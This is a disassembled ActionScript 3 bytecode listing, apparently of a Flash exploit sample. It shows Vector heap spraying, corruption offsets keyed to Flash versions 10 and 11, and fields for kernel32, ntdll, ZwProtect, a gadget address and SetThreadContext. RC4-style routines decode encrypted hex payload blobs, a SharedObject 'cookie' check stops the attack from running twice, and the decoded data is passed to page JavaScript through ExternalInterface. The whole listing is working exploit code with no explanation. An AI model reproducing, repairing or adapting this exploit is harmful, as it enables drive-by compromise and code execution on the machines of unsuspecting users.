       411  getlocal      	10
       413  pushbyte      	8
       415  add           	
       416  pushbyte      	0
       418  callpropvoid  	setArrValue (3) //nameIndex = 48
       421  pushshort     	256
       424  coerce_a      	
       425  setlocal      	10
       427  getlocal0     	
       428  getproperty   	s //nameIndex = 23
       430  getlocal1     	
       431  getproperty   	null //nameIndex = 75
       433  getlocal      	10
       435  pushbyte      	4
       437  add           	
       438  pushbyte      	4
       440  divide        	
       441  getlocal      	9
       443  pushbyte      	8
       445  add           	
       446  getlocal      	10
       448  add           	
       449  pushshort     	376
       452  add           	
       453  setproperty   	null //nameIndex = 75
       455  getlocal0     	
       456  getproperty   	s //nameIndex = 23
       458  getlocal1     	
       459  getproperty   	null //nameIndex = 75
       461  getlocal      	10
       463  pushbyte      	8
       465  add           	
       466  pushbyte      	4
       468  divide        	
       469  pushbyte      	0
       471  setproperty   	null //nameIndex = 75
       473  getlocal0     	
       474  getproperty   	s //nameIndex = 23
       476  getlocal1     	
       477  getproperty   	null //nameIndex = 75
       479  getlocal      	10
       481  pushbyte      	12
       483  add           	
       484  pushbyte      	4
       486  divide        	
       487  getlocal      	10
       489  getlocal      	9
       491  add           	
       492  pushbyte      	12
       494  add           	
       495  pushbyte      	12
       497  add           	
       498  pushbyte      	4
       500  add           	
       501  setproperty   	null //nameIndex = 75
       503  getlocal0     	
       504  getproperty   	s //nameIndex = 23
       506  getlocal1     	
       507  getproperty   	null //nameIndex = 75
       509  getlocal      	10
       511  pushbyte      	12
       513  add           	
       514  pushbyte      	12
       516  add           	
       517  pushbyte      	4
       519  divide        	
       520  pushbyte      	1
       522  setproperty   	null //nameIndex = 75
       524  getlocal      	10
       526  pushbyte      	12
       528  add           	
       529  pushbyte      	12
       531  add           	
       532  pushbyte      	4
       534  add           	
       535  coerce_a      	
       536  setlocal      	10
       538  getlocal0     	
       539  getproperty   	s //nameIndex = 23
       541  getlocal1     	
       542  getproperty   	null //nameIndex = 75
       544  getlocal      	10
       546  pushbyte      	28
       548  add           	
       549  pushbyte      	4
       551  divide        	
       552  getlocal      	9
       554  pushshort     	4088
       557  add           	
       558  pushbyte      	66
       560  subtract      	
       561  setproperty   	null //nameIndex = 75
       563  getlocal0     	
       564  getproperty   	s //nameIndex = 23
       566  getlocal1     	
       567  getproperty   	null //nameIndex = 75
       569  getlocal      	10
       571  pushbyte      	36
       573  add           	
       574  pushbyte      	4
       576  divide        	
       577  pushdouble    	4294901760
       579  setproperty   	null //nameIndex = 75
       581  getlocal0     	
       582  getproperty   	s //nameIndex = 23
       584  getlocal1     	
       585  getproperty   	null //nameIndex = 75
       587  getlocal      	10
       589  pushbyte      	48
       591  add           	
       592  pushbyte      	4
       594  divide        	
       595  pushint       	1094795585	// 0x41414141
       597  setproperty   	null //nameIndex = 75
       599  getlocal0     	
       600  getproperty   	s //nameIndex = 23
       602  getlocal1     	
       603  getproperty   	null //nameIndex = 75
       605  getlocal      	10
       607  pushbyte      	112
       609  add           	
       610  pushbyte      	4
       612  divide        	
       613  pushint       	1179010630	// 0x46464646
       615  setproperty   	null //nameIndex = 75
       617  pushshort     	4088
       620  pushbyte      	66
       622  subtract      	
       623  coerce_a      	
       624  setlocal      	10
       626  getlocal0     	
       627  getlocal1     	
       628  getlocal      	10
       630  pushbyte      	12
       632  subtract      	
       633  pushint       	1094795761	// 0x414141f1
       635  callpropvoid  	setArrValue (3) //nameIndex = 48
       638  getlocal0     	
       639  getlocal1     	
       640  getlocal      	10
       642  pushbyte      	0
       644  add           	
       645  getlocal      	9
       647  getlocal      	10
       649  add           	
       650  pushbyte      	8
       652  add           	
       653  pushbyte      	32
       655  subtract      	
       656  callpropvoid  	setArrValue (3) //nameIndex = 48
       659  getlocal0     	
       660  getlocal1     	
       661  getlocal      	10
       663  pushbyte      	8
       665  add           	
       666  pushdouble    	4294967295
       668  callpropvoid  	setArrValue (3) //nameIndex = 48
       671  getlocal0     	
       672  getlocal1     	
       673  getlocal      	10
       675  pushbyte      	12
       677  add           	
       678  pushbyte      	15
       680  callpropvoid  	setArrValue (3) //nameIndex = 48
       683  getlocal0     	
       684  getlocal1     	
       685  getlocal      	10
       687  pushbyte      	32
       689  add           	
       690  pushbyte      	0
       692  callpropvoid  	setArrValue (3) //nameIndex = 48
       695  getlocal0     	
       696  getlocal1     	
       697  getlocal      	10
       699  pushbyte      	36
       701  add           	
       702  pushbyte      	20
       704  add           	
       705  pushbyte      	0
       707  callpropvoid  	setArrValue (3) //nameIndex = 48
       710  getlocal0     	
       711  getlocal1     	
       712  getlocal      	10
       714  pushbyte      	60
       716  add           	
       717  pushdouble    	4294967295
       719  callpropvoid  	setArrValue (3) //nameIndex = 48
       722  getlocal0     	
       723  getproperty   	s //nameIndex = 23
       725  getlocal1     	
       726  getproperty   	null //nameIndex = 75
       728  pushshort     	1022
       731  decrement     	
       732  pushdouble    	4294967295
       734  setproperty   	null //nameIndex = 75
       736  jump          	L5
       
       L4: 
       740  getlocal0     	
       741  getproperty   	m_iver //nameIndex = 39
       743  pushstring    	"10"
       745  ifne          	L6

       749  getlocal0     	
       750  getlocal1     	
       751  pushbyte      	48
       753  getlocal      	9
       755  pushshort     	4088
       758  add           	
       759  pushshort     	1300
       762  subtract      	
       763  pushshort     	344
       766  subtract      	
       767  callpropvoid  	setArrValue (3) //nameIndex = 48
       770  getlocal0     	
       771  getlocal1     	
       772  pushshort     	148
       775  pushbyte      	8
       777  subtract      	
       778  pushint       	65536	// 0x10000
       780  callpropvoid  	setArrValue (3) //nameIndex = 48
       783  getlocal0     	
       784  getlocal1     	
       785  pushshort     	228
       788  pushbyte      	8
       790  subtract      	
       791  pushdouble    	4294967295
       793  callpropvoid  	setArrValue (3) //nameIndex = 48
       796  getlocal0     	
       797  getlocal1     	
       798  pushbyte      	52
       800  pushshort     	448
       803  add           	
       804  pushbyte      	0
       806  callpropvoid  	setArrValue (3) //nameIndex = 48
       809  pushshort     	512
       812  convert_u     	
       813  setlocal      	11
       815  getlocal0     	
       816  getlocal1     	
       817  getlocal      	11
       819  getlocal      	9
       821  getlocal      	11
       823  add           	
       824  callpropvoid  	setArrValue (3) //nameIndex = 48
       827  getlocal0     	
       828  getlocal1     	
       829  getlocal      	11
       831  pushbyte      	12
       833  add           	
       834  pushbyte      	1
       836  callpropvoid  	setArrValue (3) //nameIndex = 48
       839  getlocal0     	
       840  getlocal1     	
       841  getlocal      	11
       843  pushbyte      	28
       845  add           	
       846  getlocal      	9
       848  getlocal      	11
       850  add           	
       851  pushshort     	256
       854  add           	
       855  callpropvoid  	setArrValue (3) //nameIndex = 48
       858  getlocal0     	
       859  getlocal1     	
       860  getlocal      	11
       862  pushbyte      	36
       864  add           	
       865  pushint       	131072	// 0x20000
       867  callpropvoid  	setArrValue (3) //nameIndex = 48
       870  getlocal0     	
       871  getlocal1     	
       872  getlocal      	11
       874  pushbyte      	48
       876  add           	
       877  pushbyte      	0
       879  callpropvoid  	setArrValue (3) //nameIndex = 48
       882  getlocal0     	
       883  getlocal1     	
       884  getlocal      	11
       886  pushshort     	152
       889  add           	
       890  getlocal      	9
       892  pushshort     	4088
       895  add           	
       896  pushshort     	1300
       899  subtract      	
       900  pushshort     	344
       903  subtract      	
       904  callpropvoid  	setArrValue (3) //nameIndex = 48
       907  getlocal      	11
       909  pushshort     	256
       912  add           	
       913  convert_u     	
       914  setlocal      	11
       916  getlocal0     	
       917  getlocal1     	
       918  getlocal      	11
       920  pushbyte      	8
       922  add           	
       923  pushint       	131072	// 0x20000
       925  callpropvoid  	setArrValue (3) //nameIndex = 48
       928  getlocal0     	
       929  getlocal1     	
       930  getlocal      	11
       932  pushbyte      	12
       934  add           	
       935  getlocal      	12
       937  callpropvoid  	setArrValue (3) //nameIndex = 48
       940  getlocal0     	
       941  getlocal1     	
       942  getlocal      	11
       944  pushbyte      	36
       946  add           	
       947  pushbyte      	64
       949  callpropvoid  	setArrValue (3) //nameIndex = 48
       952  getlocal0     	
       953  getlocal1     	
       954  getlocal      	11
       956  pushbyte      	56
       958  add           	
       959  getlocal      	9
       961  getlocal      	11
       963  add           	
       964  pushbyte      	12
       966  add           	
       967  callpropvoid  	setArrValue (3) //nameIndex = 48
       970  getlocal0     	
       971  getlocal1     	
       972  getlocal      	11
       974  pushbyte      	68
       976  add           	
       977  pushdouble    	4294967295
       979  callpropvoid  	setArrValue (3) //nameIndex = 48
       982  getlocal0     	
       983  getlocal1     	
       984  getlocal      	11
       986  pushbyte      	92
       988  add           	
       989  getlocal      	12
       991  callpropvoid  	setArrValue (3) //nameIndex = 48
       994  getlocal0     	
       995  getlocal1     	
       996  pushbyte      	52
       998  pushshort     	3728
       1001 add           	
       1002 pushbyte      	0
       1004 callpropvoid  	setArrValue (3) //nameIndex = 48
       1007 pushshort     	4088
       1010 convert_u     	
       1011 setlocal      	11
       1013 jump          	L5
       
       L6: 
       1017 getlocal0     	
       1018 getproperty   	m_iver //nameIndex = 39
       1020 pushstring    	"11"
       1022 ifne          	L5

       1026 getlocal0     	
       1027 getlocal1     	
       1028 pushbyte      	48
       1030 getlocal      	9
       1032 pushshort     	4088
       1035 add           	
       1036 pushshort     	1592
       1039 subtract      	
       1040 pushshort     	584
       1043 subtract      	
       1044 callpropvoid  	setArrValue (3) //nameIndex = 48
       1047 getlocal0     	
       1048 getlocal1     	
       1049 pushshort     	312
       1052 pushbyte      	8
       1054 subtract      	
       1055 pushint       	65536	// 0x10000
       1057 callpropvoid  	setArrValue (3) //nameIndex = 48
       1060 getlocal0     	
       1061 getlocal1     	
       1062 pushshort     	428
       1065 pushbyte      	8
       1067 subtract      	
       1068 pushdouble    	4294967295
       1070 callpropvoid  	setArrValue (3) //nameIndex = 48
       1073 getlocal0     	
       1074 getlocal1     	
       1075 pushshort     	428
       1078 pushbyte      	12
       1080 add           	
       1081 pushbyte      	8
       1083 subtract      	
       1084 pushdouble    	4294967295
       1086 callpropvoid  	setArrValue (3) //nameIndex = 48
       1089 pushshort     	512
       1092 convert_u     	
       1093 setlocal      	11
       1095 getlocal0     	
       1096 getlocal1     	
       1097 getlocal      	11
       1099 getlocal      	9
       1101 getlocal      	11
       1103 add           	
       1104 callpropvoid  	setArrValue (3) //nameIndex = 48
       1107 getlocal0     	
       1108 getlocal1     	
       1109 getlocal      	11
       1111 pushbyte      	12
       1113 add           	
       1114 pushbyte      	1
       1116 callpropvoid  	setArrValue (3) //nameIndex = 48
       1119 getlocal0     	
       1120 getlocal1     	
       1121 getlocal      	11
       1123 pushbyte      	28
       1125 add           	
       1126 getlocal      	9
       1128 getlocal      	11
       1130 add           	
       1131 pushshort     	256
       1134 add           	
       1135 callpropvoid  	setArrValue (3) //nameIndex = 48
       1138 getlocal0     	
       1139 getlocal1     	
       1140 getlocal      	11
       1142 pushbyte      	36
       1144 add           	
       1145 pushbyte      	0
       1147 callpropvoid  	setArrValue (3) //nameIndex = 48
       1150 getlocal      	11
       1152 pushshort     	256
       1155 add           	
       1156 convert_u     	
       1157 setlocal      	11
       1159 getlocal0     	
       1160 getlocal1     	
       1161 getlocal      	11
       1163 pushbyte      	8
       1165 add           	
       1166 pushint       	131072	// 0x20000
       1168 callpropvoid  	setArrValue (3) //nameIndex = 48
       1171 getlocal0     	
       1172 getlocal1     	
       1173 getlocal      	11
       1175 pushbyte      	68
       1177 add           	
       1178 pushdouble    	4294967295
       1180 callpropvoid  	setArrValue (3) //nameIndex = 48
       1183 getlocal0     	
       1184 getlocal1     	
       1185 getlocal      	11
       1187 pushbyte      	92
       1189 add           	
       1190 getlocal      	12
       1192 callpropvoid  	setArrValue (3) //nameIndex = 48
       1195 pushshort     	4088
       1198 convert_u     	
       1199 setlocal      	11
       
       L5: 
       1201 getlocal1     	
       1202 increment     	
       1203 coerce_a      	
       1204 setlocal1     	
       
       L1: 
       1205 getlocal1     	
       1206 getlocal0     	
       1207 getproperty   	m_suf //nameIndex = 45
       1209 iflt          	L2

       1213 pushbyte      	0
       1215 coerce_a      	
       1216 setlocal1     	
       1217 jump          	L7

       
       L8: 
       1221 label         	
       1222 getlocal0     	
       1223 getproperty   	ss //nameIndex = 12
       1225 getlocal1     	
       1226 getlex        	Vector //nameIndex = 82
       1228 getlex        	Object //nameIndex = 13
       1230 applytype     	(1)
       1232 getlocal      	8
       1234 construct     	(1)
       1236 setproperty   	null //nameIndex = 75
       1238 pushbyte      	0
       1240 coerce_a      	
       1241 setlocal2     	
       1242 jump          	L9

       
       L10: 
       1246 label         	
       1247 getlocal0     	
       1248 getproperty   	ss //nameIndex = 12
       1250 getlocal1     	
       1251 getproperty   	null //nameIndex = 75
       1253 getlocal2     	
       1254 getlocal0     	
       1255 getproperty   	private::snd //nameIndex = 16
       1257 setproperty   	null //nameIndex = 75
       1259 getlocal2     	
       1260 increment     	
       1261 coerce_a      	
       1262 setlocal2     	
       
       L9: 
       1263 getlocal2     	
       1264 getlocal      	8
       1266 iflt          	L10

       1270 getlocal1     	
       1271 increment     	
       1272 coerce_a      	
       1273 setlocal1     	
       
       L7: 
       1274 getlocal1     	
       1275 pushshort     	1024
       1278 iflt          	L8

       1282 getlex        	flash.external::ExternalInterface //nameIndex = 77
       1284 getproperty   	available //nameIndex = 84
       1286 iffalse       	L11

       1290 getlex        	flash.external::ExternalInterface //nameIndex = 77
       1292 pushstring    	"eim"
       1294 getlocal0     	
       1295 getlocal0     	
       1296 getproperty   	private::m_trg //nameIndex = 20
       1298 callproperty  	private::decode (1) //nameIndex = 51
       1301 callproperty  	toString (0) //nameIndex = 85
       1304 callpropvoid  	call (2) //nameIndex = 78
       
       L11: 
       1307 getlocal0     	
       1308 getproperty   	private::work //nameIndex = 21
       1310 callpropvoid  	start (0) //nameIndex = 86
       1313 getlocal0     	
       1314 getproperty   	private::work //nameIndex = 21
       1316 getlex        	flash.events::TimerEvent //nameIndex = 9
       1318 getproperty   	TIMER //nameIndex = 87
       1320 getlocal0     	
       1321 getproperty   	private::proc //nameIndex = 67
       1323 callpropvoid  	addEventListener (2) //nameIndex = 88
       1326 returnvoid    	
     }
     var ss:__AS3__.vec::Vector.<Object>	/* slot_id 0 */
     var private::delay:uint = 1000	/* slot_id 0 */
     var private::snd:flash.media::Sound	/* slot_id 0 */
     var private::m_dump7:String = "5467ebaa5baab6c9d945321215d4f075251af2717b30cde85bdcede9d17bfb6eff2aa25e9b34ad7a1670ab5abc27b19273f17f197765196c0299b84f190b848f1d39eb95428d0e631343348b378f8d1246d2f5b33a4efff9a47f941a3eb02b290b2ac6732987f56d8c442af410beccbeac3cbbeaead69d33b790d0a8c32381ae11e4d7fe6802d9784ccf567380c1f9147f2e9577e0d01e392bb36d2421987f981c6745abbc5a57fa4d5f33047c95fa99882b23fd68b68b22ff25144978ff38499785a0bdf37635dbfddfd38264dcc3c0dd5f248dc26fd97fbf811f53edbb781c657928a6ea83b9420a139d31f8437ff98c66407b96acd9fc171dca9db15142f1379b269a5d6c3d3e806e94a5e442b1b2f4e8bff536654e2ca1a64e6df678ceeb58935219a7b2765068ebe20bc6675ef7f568f10a57fd153294ebacaf1e483ba01b657fe4b91ea025cb44c6b528dadd3ac4983bfcdd0fe9855217e9f4edc9d653b73f2f64f93bc76512194edad58fef5b96225676d0900e20b52e66c2c1d5d6b39080b8d021c1dd4511066957acead8e861e090401ff8c7f2865f845db36240d2f30194e775db98c883a1b64bcf93559c07c5ef6fb3c6da00b18614e6228747294ccb546cb8abe22bc9e15584afc4a249723ce594d9bc6d5e900db1ad4a3bd461cf7a060700bc580cd2cd238ff95b009ad81ed00abcf05d2632eb089f6e748983955f6b5104014fec4a138c6977d78c50a26a79166da8cbc9042a6f60a4139dffee2998c33902b254367b4344982ef09ec509d074aff79b47f6141628a53a73da9193ad5259e42387aeeaa6652994b4bdef90dc764091e477993eca3cb821475a0f1450b0956814cb256f357f71380c0d7f5718126a3410cb835721ec5bbfec69f57bcd56d04ee8a606da46a653bf43b12c0422511956ea79c98fce1afbd0c64ca3148b6e442e44301d3bb8b93587ecc2a86b48c406930978bad9cb0d5c5e627c87fd07eebb3305b343468bda57e0083e558e3155b02770e8dd5a1f22a810aec453be2430a200b28da859cecbe12aa384c9419e6f663c8fbae50340593babd6b2b0aab93a62623fe55a8ed41e98c613b5fd26435701b2dca49126f092f59e848692c411a6be306a2d5b6ebdabc4786fb7012a63b67e9d521a6043592fbba03f0de5f6ad22498dcc8fa2fce9e56fcfa4115caab30947d2a882be6b33d38ffc3ec5f1c2597ba7ef57d640584ad0ffbbf18158aabe762864064e155054238a8e2e097285f94f3a4f14866e739d4e54bcbf5f6d4491a8f4637c5f698ecc43f11b50354b8e85ce4790b06c714f40791175952a8c8d8b8b79b1ccebe03e6dcfd2da3aacea36222a6cf09a04726411b846f808058fb35abd407349a41e83c9bac9c3b4b7fd3f88d11d429840bc09e73088568d871d96585335258b0764f7b830d8f9a976d3d8ec309740cf8c2327286229dc8cea287d33761f4336faa5754028c4a1371278df3e8be864ac17737a0f562c287d2bbfdd3da83d5040d019d92dfe430f43b5126562e60615b1c741f07af8c711563de208b266e9a865ab1573e780725bbc160f4d22165b128bee7108c30385990f9f9153e9a402ed0961b240260d3dd7ab14585488c6779d64c93bd7176157a2152c41455518b5004a84df6a4ed1ec0bec6cf1fb60188bbe93385caaa0902d9a2a12bf5c06cbc85f9e9cd523eb6e54cca35a2498e3791cefabd8166c406bf053de550c26089cb02c879d89b817b258d2e7d45885ca387edebd0097ffa830892d2a9665047942ca87f82009cf1caafa13490a9e0b657fed2a6669659c80dac79e4a5ec540bd645b5d503880b642992ea8c1b0f3846c648f0a0b2a7fd52c1517f96a0a34b59089b347b58f98fc89b5b3824c6e600675a502eac5092d"	/* slot_id 0 */
     var private::m_keys:String = "2eb31f09e9a77a0fde5a1a23eff067a24a98840ceabf048497b3"	/* slot_id 0 */
     var private::m_trg:String = "42ee4b892986a326ea5aad1017918a235b0c5e940c449a9d40a585ce8f7b9a0ae8b6f4f0af281700b2064a6015fc0f16389e3bb2881c7d8a66f795488b3433d998be87f7992abb833329d2e086f134a908510b82dec1db1f822db7bf25cd27e9983aaf2587188597a0dc02d58017a28899dfa5a68d6b7797a4ff008e9dde631865690065d4958b51209335a5fe4f4f25ad74a21ff75a49ba1d85c88382baaa283e7eba819b33868d30a02c7983f41566b7560e51ed24acc663c38a1169ecefeca6248054fdc51e35e024f97a7673f464d9da093c94cdb2c8f53f2edaab1f51ae62d8560ef63c87f642b1b19cf6e756439a9d25f4c017ff7c4db8e757b6be7c6f"	/* slot_id 0 */
     var private::work:flash.utils::Timer	/* slot_id 0 */
     var s:__AS3__.vec::Vector.<Object>	/* slot_id 0 */
     var tf:flash.text::TextField	/* slot_id 0 */
     var private::found:Boolean = false	/* slot_id 0 */
     var private::m_mark:Boolean = false	/* slot_id 0 */
     var private::repeat:uint = 4096	/* slot_id 0 */
     var m_status:* = 0	/* slot_id 0 */
     var private::m_longArrBase:uint = 0	/* slot_id 0 */
     var private::m_longArrIdx:uint = 0	/* slot_id 0 */
     var private::m_flashBase:uint = 0	/* slot_id 0 */
     var private::m_flashVirtual:uint = 0	/* slot_id 0 */
     var private::m_kernel32Base:uint = 0	/* slot_id 0 */
     var private::m_ntdllBase:uint = 0	/* slot_id 0 */
     var private::m_ZwProtectAddr:uint = 0	/* slot_id 0 */
     var private::m_xchgInstAddr:uint = 0	/* slot_id 0 */
     var private::m_SetThreadContext:uint = 0	/* slot_id 0 */
     var m_iver:String	/* slot_id 0 */
     var org:String = "vector"	/* slot_id 0 */
     var m_mySo:flash.net::SharedObject	/* slot_id 0 */
     var m_Ostring:String = "Pidj7gbU"	/* slot_id 0 */
     var m_rawLen:* = 0	/* slot_id 0 */
     var m_suf:* = 90466	/* slot_id 0 */

     function private::ShareObjEx():Boolean	/* disp_id=0 method_id=1 nameIndex = 46 */
     {
       // local_count=2 max_scope=1 max_stack=2 code_len=38
       // method position=5309 code position=5721
       0    getlocal0     	
       1    pushscope     	
       2    findpropstrict	Date //nameIndex = 68
       4    constructprop 	Date (0) //nameIndex = 68
       7    callproperty  	http://adobe.com/AS3/2006/builtin::getTime (0) //nameIndex = 69
       10   coerce_a      	
       11   setlocal1     	
       12   getlocal0     	
       13   getproperty   	m_mySo //nameIndex = 41
       15   getproperty   	data //nameIndex = 70
       17   getlocal0     	
       18   getproperty   	m_Ostring //nameIndex = 43
       20   setproperty   	Cookie //nameIndex = 71
       22   getlocal0     	
       23   getproperty   	m_mySo //nameIndex = 41
       25   getproperty   	data //nameIndex = 70
       27   getlocal1     	
       28   setproperty   	newDate //nameIndex = 72
       30   getlocal0     	
       31   getproperty   	m_mySo //nameIndex = 41
       33   callpropvoid  	flush (0) //nameIndex = 73
       36   pushtrue      	
       37   returnvalue   	
     }

     function private::DetmineCookie():Boolean	/* disp_id=0 method_id=2 nameIndex = 47 */
     {
       // local_count=1 max_scope=1 max_stack=2 code_len=52
       // method position=5313 code position=5767
       0    getlocal0     	
       1    pushscope     	
       2    getlocal0     	
       3    getproperty   	m_mySo //nameIndex = 41
       5    getproperty   	data //nameIndex = 70
       7    pushstring    	"Cookie"
       9    callproperty  	http://adobe.com/AS3/2006/builtin::hasOwnProperty (1) //nameIndex = 74
       12   convert_b     	
       13   dup           	
       14   iffalse       	L1

       18   pop           	
       19   getlocal0     	
       20   getproperty   	m_mySo //nameIndex = 41
       22   getproperty   	data //nameIndex = 70
       24   pushstring    	"newDate"
       26   callproperty  	http://adobe.com/AS3/2006/builtin::hasOwnProperty (1) //nameIndex = 74
       29   convert_b     	
       
       L1: 
       30   iffalse       	L2

       34   getlocal0     	
       35   getproperty   	m_mySo //nameIndex = 41
       37   getproperty   	data //nameIndex = 70
       39   getproperty   	Cookie //nameIndex = 71
       41   getlocal0     	
       42   getproperty   	m_Ostring //nameIndex = 43
       44   ifne          	L2

       48   pushtrue      	
       49   returnvalue   	
       
       L2: 
       50   pushfalse     	
       51   returnvalue   	
     }

     function setArrValue(uint,uint,uint):void	/* disp_id=0 method_id=3 nameIndex = 48 */
     {
       // local_count=4 max_scope=1 max_stack=6 code_len=110
       // method position=5317 code position=5827
       0    getlocal0     	
       1    pushscope     	
       2    getlocal2     	
       3    pushbyte      	2
       5    bitand        	
       6    iffalse       	L1

       10   getlocal0     	
       11   getproperty   	s //nameIndex = 23
       13   getlocal1     	
       14   getproperty   	null //nameIndex = 75
       16   getlocal2     	
       17   pushbyte      	2
       19   subtract      	
       20   pushbyte      	4
       22   divide        	
       23   getlocal3     	
       24   pushint       	65535	// 0xffff
       26   bitand        	
       27   pushbyte      	16
       29   lshift        	
       30   getlocal0     	
       31   getproperty   	s //nameIndex = 23
       33   getlocal1     	
       34   getproperty   	null //nameIndex = 75
       36   getlocal2     	
       37   pushbyte      	2
       39   subtract      	
       40   pushbyte      	4
       42   divide        	
       43   getproperty   	null //nameIndex = 75
       45   pushint       	65535	// 0xffff
       47   bitand        	
       48   bitor         	
       49   setproperty   	null //nameIndex = 75
       51   getlocal0     	
       52   getproperty   	s //nameIndex = 23
       54   getlocal1     	
       55   getproperty   	null //nameIndex = 75
       57   getlocal2     	
       58   pushbyte      	2
       60   add           	
       61   pushbyte      	4
       63   divide        	
       64   getlocal0     	
       65   getproperty   	s //nameIndex = 23
       67   getlocal1     	
       68   getproperty   	null //nameIndex = 75
       70   getlocal2     	
       71   pushbyte      	2
       73   add           	
       74   pushbyte      	4
       76   divide        	
       77   getproperty   	null //nameIndex = 75
       79   pushdouble    	4294901760
       81   bitand        	
       82   getlocal3     	
       83   pushdouble    	4294901760
       85   bitand        	
       86   pushbyte      	16
       88   rshift        	
       89   bitor         	
       90   setproperty   	null //nameIndex = 75
       92   jump          	L2
       
       L1: 
       96   getlocal0     	
       97   getproperty   	s //nameIndex = 23
       99   getlocal1     	
       100  getproperty   	null //nameIndex = 75
       102  getlocal2     	
       103  pushbyte      	4
       105  divide        	
       106  getlocal3     	
       107  setproperty   	null //nameIndex = 75
       
       L2: 
       109  returnvoid    	
     }

     function free():*	/* disp_id=0 method_id=4 nameIndex = 49 */
     {
       // local_count=2 max_scope=1 max_stack=3 code_len=77
       // method position=5324 code position=5945
       0    getlocal0     	
       1    pushscope     	
       2    pushbyte      	0
       4    convert_u     	
       5    setlocal1     	
       6    jump          	L1

       
       L2: 
       10   label         	
       11   getlocal0     	
       12   getproperty   	s //nameIndex = 23
       14   getlocal1     	
       15   pushnull      	
       16   setproperty   	null //nameIndex = 75
       18   getlocal1     	
       19   increment     	
       20   convert_u     	
       21   setlocal1     	
       
       L1: 
       22   getlocal1     	
       23   getlocal0     	
       24   getproperty   	m_suf //nameIndex = 45
       26   iflt          	L2

       30   getlocal0     	
       31   pushnull      	
       32   setproperty   	s //nameIndex = 23
       34   pushbyte      	0
       36   convert_u     	
       37   setlocal1     	
       38   jump          	L3

       
       L4: 
       42   label         	
       43   getlocal0     	
       44   getproperty   	ss //nameIndex = 12
       46   getlocal1     	
       47   pushnull      	
       48   setproperty   	null //nameIndex = 75
       50   getlocal1     	
       51   increment     	
       52   convert_u     	
       53   setlocal1     	
       
       L3: 
       54   getlocal1     	
       55   getlocal0     	
       56   getproperty   	ss //nameIndex = 12
       58   getproperty   	length //nameIndex = 76
       60   iflt          	L4

       64   getlocal0     	
       65   pushnull      	
       66   setproperty   	ss //nameIndex = 12
       68   getlex        	flash.external::ExternalInterface //nameIndex = 77
       70   pushstring    	"fl"
       72   pushnull      	
       73   callpropvoid  	call (2) //nameIndex = 78
       76   returnvoid    	
     }

     function private::hexToIntArray(String):__AS3__.vec::Vector.<int>	/* disp_id=0 method_id=6 nameIndex = 50 */
     {
       // local_count=7 max_scope=1 max_stack=5 code_len=99
       // method position=5332 code position=7366
       0    getlocal0     	
       1    pushscope     	
       2    pushnull      	
       3    coerce_a      	
       4    setlocal2     	
       5    getlocal1     	
       6    getproperty   	length //nameIndex = 76
       8    coerce_a      	
       9    setlocal3     	
       10   pushbyte      	0
       12   coerce_a      	
       13   setlocal      	4
       15   getlex        	Vector //nameIndex = 82
       17   getlex        	int //nameIndex = 5
       19   applytype     	(1)
       21   getlocal3     	
       22   pushbyte      	2
       24   divide        	
       25   construct     	(1)
       27   coerce        	__AS3__.vec::Vector.<int> //nameIndex = 6
       29   setlocal      	5
       31   pushbyte      	0
       33   coerce_a      	
       34   setlocal      	6
       36   jump          	L1

       
       L2: 
       40   label         	
       41   getlocal1     	
       42   getlocal      	4
       44   callproperty  	http://adobe.com/AS3/2006/builtin::charAt (1) //nameIndex = 89
       47   getlocal1     	
       48   getlocal      	4
       50   pushbyte      	1
       52   add           	
       53   callproperty  	http://adobe.com/AS3/2006/builtin::charAt (1) //nameIndex = 89
       56   add           	
       57   coerce_a      	
       58   setlocal2     	
       59   getlocal      	5
       61   getlocal      	6
       63   findpropstrict	parseInt //nameIndex = 90
       65   getlocal2     	
       66   pushbyte      	16
       68   callproperty  	parseInt (2) //nameIndex = 90
       71   setproperty   	null //nameIndex = 75
       73   getlocal      	4
       75   pushbyte      	2
       77   add           	
       78   coerce_a      	
       79   setlocal      	4
       81   getlocal      	6
       83   pushbyte      	1
       85   add           	
       86   coerce_a      	
       87   setlocal      	6
       
       L1: 
       89   getlocal      	4
       91   getlocal3     	
       92   iflt          	L2

       96   getlocal      	5
       98   returnvalue   	
     }

     function private::decode(String):flash.utils::ByteArray	/* disp_id=0 method_id=7 nameIndex = 51 */
     {
       // local_count=14 max_scope=1 max_stack=5 code_len=329
       // method position=5337 code position=7473
       0    getlocal0     	
       1    pushscope     	
       2    pushbyte      	0
       4    setlocal      	6
       6    pushbyte      	0
       8    setlocal      	8
       10   pushundefined 	
       11   coerce_a      	
       12   setlocal      	9
       14   pushbyte      	0
       16   setlocal      	13
       18   getlex        	Vector //nameIndex = 82
       20   getlex        	int //nameIndex = 5
       22   applytype     	(1)
       24   pushshort     	256
       27   construct     	(1)
       29   coerce        	__AS3__.vec::Vector.<int> //nameIndex = 6
       31   setlocal2     	
       32   getlex        	Vector //nameIndex = 82
       34   getlex        	int //nameIndex = 5
       36   applytype     	(1)
       38   pushshort     	256
       41   construct     	(1)
       43   coerce        	__AS3__.vec::Vector.<int> //nameIndex = 6
       45   setlocal3     	
       46   getlocal0     	
       47   getlocal0     	
       48   getproperty   	private::m_keys //nameIndex = 19
       50   callproperty  	private::hexToIntArray (1) //nameIndex = 50
       53   coerce        	__AS3__.vec::Vector.<int> //nameIndex = 6
       55   dup           	
       56   setlocal      	4
       58   getproperty   	length //nameIndex = 76
       60   convert_i     	
       61   setlocal      	5
       63   pushbyte      	0
       65   setlocal      	6
       67   jump          	L1

       
       L2: 
       71   label         	
       72   getlocal2     	
       73   getlocal      	6
       75   getlocal      	6
       77   setproperty   	null //nameIndex = 75
       79   getlocal3     	
       80   getlocal      	6
       82   getlocal      	4
       84   getlocal      	6
       86   getlocal      	5
       88   modulo        	
       89   getproperty   	null //nameIndex = 75
       91   setproperty   	null //nameIndex = 75
       93   inclocal_i    	6
       
       L1: 
       95   getlocal      	6
       97   pushshort     	256
       100  iflt          	L2

       104  pushbyte      	0
       106  setlocal      	7
       108  pushbyte      	0
       110  coerce_a      	
       111  setlocal      	9
       113  jump          	L3

       
       L4: 
       117  label         	
       118  getlocal      	7
       120  getlocal2     	
       121  getlocal      	9
       123  getproperty   	null //nameIndex = 75
       125  add           	
       126  getlocal3     	
       127  getlocal      	9
       129  getproperty   	null //nameIndex = 75
       131  add           	
       132  pushshort     	255
       135  bitand        	
       136  setlocal      	7
       138  getlocal2     	
       139  getlocal      	9
       141  getproperty   	null //nameIndex = 75
       143  convert_i     	
       144  setlocal      	8
       146  getlocal2     	
       147  getlocal      	9
       149  getlocal2     	
       150  getlocal      	7
       152  getproperty   	null //nameIndex = 75
       154  setproperty   	null //nameIndex = 75
       156  getlocal2     	
